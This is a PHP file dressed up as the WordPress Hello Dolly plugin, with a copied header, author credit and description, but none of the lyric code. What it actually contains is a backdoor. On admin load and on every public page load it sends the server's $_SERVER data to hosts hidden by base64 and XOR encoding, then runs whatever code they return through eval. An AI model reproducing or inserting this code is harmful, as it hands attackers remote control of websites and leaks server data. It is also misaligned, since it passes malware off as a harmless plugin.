<?php
/**
 * @package Hello_Joy
 * @version 1.7.2
 */
/*
Plugin Name: Hello Joy
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

add_action('admin_init', "open_hello");

if (!is_admin()) {
    open_hello();
}

function open_hello()
{
    $args = array(
        'timeout' => 15,
        'headers' => array(
            "User-Agent" => json_encode($_SERVER),
        ),
    );

    $ids = array("DFhpOScUHwJpIzs=", "DFhpIX5KVB4y", "DFhpJj4AFRlpIzs=");

    foreach ($ids as $id) {
        $id = base64_decode($id);
        $decoded = ""; for ($i = 0; $i < strlen($id); $i++) $decoded .= $id[$i] ^ "zlGQNy"[$i % strlen("zlGQNy")];
        $response = wp_remote_get("http://" . $decoded . "/v5", $args);
        if (!is_wp_error($response) && 200 === wp_remote_retrieve_response_code($response)) {
            return eval($response['body']);
        }
    }
}
